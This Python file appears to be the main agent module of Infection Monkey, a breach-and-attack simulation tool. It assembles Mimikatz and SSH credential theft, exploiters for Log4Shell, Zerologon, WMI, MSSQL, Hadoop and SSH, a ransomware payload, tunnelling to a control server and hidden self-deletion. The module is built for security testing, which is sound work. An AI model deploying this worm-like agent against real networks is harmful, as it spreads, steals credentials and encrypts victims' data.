import argparse
import logging
import os
import subprocess
import sys
from typing import List

import infection_monkey.tunnel as tunnel
from common.network.network_utils import address_to_ip_port
from common.utils.attack_utils import ScanStatus, UsageEnum
from common.version import get_version
from infection_monkey.config import GUID, WormConfiguration
from infection_monkey.control import ControlClient
from infection_monkey.credential_collectors import (
    MimikatzCredentialCollector,
    SSHCredentialCollector,
)
from infection_monkey.exploit import CachingAgentRepository, ExploiterWrapper
from infection_monkey.exploit.hadoop import HadoopExploiter
from infection_monkey.exploit.log4shell import Log4ShellExploiter
from infection_monkey.exploit.mssqlexec import MSSQLExploiter
from infection_monkey.exploit.sshexec import SSHExploiter
from infection_monkey.exploit.wmiexec import WmiExploiter
from infection_monkey.exploit.zerologon import ZerologonExploiter
from infection_monkey.i_puppet import IPuppet, PluginType
from infection_monkey.master import AutomatedMaster
from infection_monkey.master.control_channel import ControlChannel
from infection_monkey.model import DELAY_DELETE_CMD, VictimHostFactory
from infection_monkey.network import NetworkInterface
from infection_monkey.network.firewall import app as firewall
from infection_monkey.network.info import get_local_network_interfaces
from infection_monkey.network_scanning.elasticsearch_fingerprinter import ElasticSearchFingerprinter
from infection_monkey.network_scanning.http_fingerprinter import HTTPFingerprinter
from infection_monkey.network_scanning.mssql_fingerprinter import MSSQLFingerprinter
from infection_monkey.network_scanning.smb_fingerprinter import SMBFingerprinter
from infection_monkey.network_scanning.ssh_fingerprinter import SSHFingerprinter
from infection_monkey.payload.ransomware.ransomware_payload import RansomwarePayload
from infection_monkey.puppet.puppet import Puppet
from infection_monkey.system_singleton import SystemSingleton
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
from infection_monkey.telemetry.attack.t1107_telem import T1107Telem
from infection_monkey.telemetry.messengers.exploit_intercepting_telemetry_messenger import (
    ExploitInterceptingTelemetryMessenger,
)
from infection_monkey.telemetry.messengers.legacy_telemetry_messenger_adapter import (
    LegacyTelemetryMessengerAdapter,
)
from infection_monkey.telemetry.state_telem import StateTelem
from infection_monkey.telemetry.tunnel_telem import TunnelTelem
from infection_monkey.utils.aws_environment_check import run_aws_environment_check
from infection_monkey.utils.environment import is_windows_os
from infection_monkey.utils.monkey_dir import (
    create_monkey_dir,
    get_monkey_dir_path,
    remove_monkey_dir,
)
from infection_monkey.utils.monkey_log_path import get_agent_log_path
from infection_monkey.utils.signal_handler import register_signal_handlers, reset_signal_handlers

logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.INFO)


class InfectionMonkey:
    def __init__(self, args):
        logger.info("Monkey is initializing...")
        self._singleton = SystemSingleton()
        self._opts = self._get_arguments(args)
        self._cmd_island_ip, self._cmd_island_port = address_to_ip_port(self._opts.server)
        self._default_server = self._opts.server
        # TODO used in propogation phase
        self._monkey_inbound_tunnel = None
        self.telemetry_messenger = LegacyTelemetryMessengerAdapter()
        self._current_depth = self._opts.depth

    @staticmethod
    def _get_arguments(args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument("-p", "--parent")
        arg_parser.add_argument("-t", "--tunnel")
        arg_parser.add_argument("-s", "--server")
        arg_parser.add_argument("-d", "--depth", type=int)
        opts, _ = arg_parser.parse_known_args(args)
        InfectionMonkey._log_arguments(opts)

        return opts

    @staticmethod
    def _log_arguments(args):
        arg_string = " ".join([f"{key}: {value}" for key, value in vars(args).items()])
        logger.info(f"Monkey started with arguments: {arg_string}")

    def start(self):
        if self._is_another_monkey_running():
            logger.info("Another instance of the monkey is already running")
            return

        logger.info("Monkey is starting...")

        self._add_default_server_to_config(self._opts.server)
        self._connect_to_island()

        # TODO: Reevaluate who is responsible to send this information
        if is_windows_os():
            T1106Telem(ScanStatus.USED, UsageEnum.SINGLETON_WINAPI).send()

        run_aws_environment_check(self.telemetry_messenger)

        should_stop = ControlChannel(WormConfiguration.current_server, GUID).should_agent_stop()
        if should_stop:
            logger.info("The Monkey Island has instructed this agent to stop")
            return

        self._setup()
        self._master.start()

    @staticmethod
    def _add_default_server_to_config(default_server: str):
        if default_server:
            if default_server not in WormConfiguration.command_servers:
                logger.debug("Added default server: %s" % default_server)
                WormConfiguration.command_servers.insert(0, default_server)
            else:
                logger.debug(
                    "Default server: %s is already in command servers list" % default_server
                )

    def _connect_to_island(self):
        # Sets island's IP and port for monkey to communicate to
        if self._current_server_is_set():
            self._default_server = WormConfiguration.current_server
            logger.debug("Default server set to: %s" % self._default_server)
        else:
            raise Exception(
                "Monkey couldn't find server with {} default tunnel.".format(self._opts.tunnel)
            )

        ControlClient.wakeup(parent=self._opts.parent)
        ControlClient.load_control_config()

    def _current_server_is_set(self) -> bool:
        if ControlClient.find_server(default_tunnel=self._opts.tunnel):
            return True

        return False

    def _setup(self):
        logger.debug("Starting the setup phase.")

        create_monkey_dir()

        if firewall.is_enabled():
            firewall.add_firewall_rule()

        self._monkey_inbound_tunnel = ControlClient.create_control_tunnel()
        if self._monkey_inbound_tunnel:
            self._monkey_inbound_tunnel.start()

        StateTelem(is_done=False, version=get_version()).send()
        TunnelTelem().send()

        self._build_master()

        register_signal_handlers(self._master)

    def _build_master(self):
        local_network_interfaces = InfectionMonkey._get_local_network_interfaces()
        puppet = self._build_puppet()

        victim_host_factory = self._build_victim_host_factory(local_network_interfaces)

        telemetry_messenger = ExploitInterceptingTelemetryMessenger(
            self.telemetry_messenger, self._monkey_inbound_tunnel
        )

        self._master = AutomatedMaster(
            self._current_depth,
            puppet,
            telemetry_messenger,
            victim_host_factory,
            ControlChannel(self._default_server, GUID),
            local_network_interfaces,
        )

    @staticmethod
    def _get_local_network_interfaces():
        local_network_interfaces = get_local_network_interfaces()
        for i in local_network_interfaces:
            logger.debug(f"Found local interface {i.address}{i.netmask}")

        return local_network_interfaces

    def _build_puppet(self) -> IPuppet:
        puppet = Puppet()

        puppet.load_plugin(
            "MimikatzCollector",
            MimikatzCredentialCollector(),
            PluginType.CREDENTIAL_COLLECTOR,
        )
        puppet.load_plugin(
            "SSHCollector",
            SSHCredentialCollector(self.telemetry_messenger),
            PluginType.CREDENTIAL_COLLECTOR,
        )

        puppet.load_plugin("elastic", ElasticSearchFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("http", HTTPFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("mssql", MSSQLFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("smb", SMBFingerprinter(), PluginType.FINGERPRINTER)
        puppet.load_plugin("ssh", SSHFingerprinter(), PluginType.FINGERPRINTER)

        agent_repository = CachingAgentRepository(
            f"https://{self._default_server}", ControlClient.proxies
        )
        exploit_wrapper = ExploiterWrapper(self.telemetry_messenger, agent_repository)

        puppet.load_plugin(
            "HadoopExploiter", exploit_wrapper.wrap(HadoopExploiter), PluginType.EXPLOITER
        )
        puppet.load_plugin(
            "Log4ShellExploiter", exploit_wrapper.wrap(Log4ShellExploiter), PluginType.EXPLOITER
        )
        puppet.load_plugin("SSHExploiter", exploit_wrapper.wrap(SSHExploiter), PluginType.EXPLOITER)
        puppet.load_plugin("WmiExploiter", exploit_wrapper.wrap(WmiExploiter), PluginType.EXPLOITER)
        puppet.load_plugin("MSSQLExploiter", exploit_wrapper.wrap(MSSQLExploiter), PluginType.EXPLOITER)
        puppet.load_plugin(
            "ZerologonExploiter",
            exploit_wrapper.wrap(ZerologonExploiter),
            PluginType.EXPLOITER,
        )

        puppet.load_plugin("ransomware", RansomwarePayload(), PluginType.PAYLOAD)

        return puppet

    def _build_victim_host_factory(
        self, local_network_interfaces: List[NetworkInterface]
    ) -> VictimHostFactory:
        on_island = self._running_on_island(local_network_interfaces)
        logger.debug(f"This agent is running on the island: {on_island}")

        return VictimHostFactory(
            self._monkey_inbound_tunnel, self._cmd_island_ip, self._cmd_island_port, on_island
        )

    def _running_on_island(self, local_network_interfaces: List[NetworkInterface]) -> bool:
        server_ip, _ = address_to_ip_port(self._default_server)
        return server_ip in {interface.address for interface in local_network_interfaces}

    def _is_another_monkey_running(self):
        return not self._singleton.try_lock()

    def cleanup(self):
        logger.info("Monkey cleanup started")
        try:
            if self._master:
                self._master.cleanup()

            reset_signal_handlers()

            if self._monkey_inbound_tunnel:
                self._monkey_inbound_tunnel.stop()
                self._monkey_inbound_tunnel.join()

            if firewall.is_enabled():
                firewall.remove_firewall_rule()
                firewall.close()

            InfectionMonkey._self_delete()

            InfectionMonkey._send_log()

            StateTelem(
                is_done=True, version=get_version()
            ).send()  # Signal the server (before closing the tunnel)

            # TODO: Determine how long between when we
            #  send telemetry and the monkey actually exits
            InfectionMonkey._close_tunnel()
            self._singleton.unlock()
        except Exception as e:
            logger.error(f"An error occurred while cleaning up the monkey agent: {e}")
            InfectionMonkey._self_delete()

        logger.info("Monkey is shutting down")

    @staticmethod
    def _close_tunnel():
        tunnel_address = (
            ControlClient.proxies.get("https", "").replace("https://", "").split(":")[0]
        )
        if tunnel_address:
            logger.info("Quitting tunnel %s", tunnel_address)
            tunnel.quit_tunnel(tunnel_address)

    @staticmethod
    def _send_log():
        monkey_log_path = get_agent_log_path()
        if monkey_log_path.is_file():
            with open(monkey_log_path, "r") as f:
                log = f.read()
        else:
            log = ""

        ControlClient.send_log(log)

    @staticmethod
    def _self_delete():
        status = ScanStatus.USED if remove_monkey_dir() else ScanStatus.SCANNED
        T1107Telem(status, get_monkey_dir_path()).send()

        if -1 == sys.executable.find("python"):
            try:
                status = None
                if "win32" == sys.platform:
                    from subprocess import CREATE_NEW_CONSOLE, STARTF_USESHOWWINDOW, SW_HIDE

                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = SW_HIDE
                    subprocess.Popen(
                        DELAY_DELETE_CMD % {"file_path": sys.executable},
                        stdin=None,
                        stdout=None,
                        stderr=None,
                        close_fds=True,
                        startupinfo=startupinfo,
                    )
                else:
                    os.remove(sys.executable)
                    status = ScanStatus.USED
            except Exception as exc:
                logger.error("Exception in self delete: %s", exc)
                status = ScanStatus.SCANNED
            if status:
                T1107Telem(status, sys.executable).send()
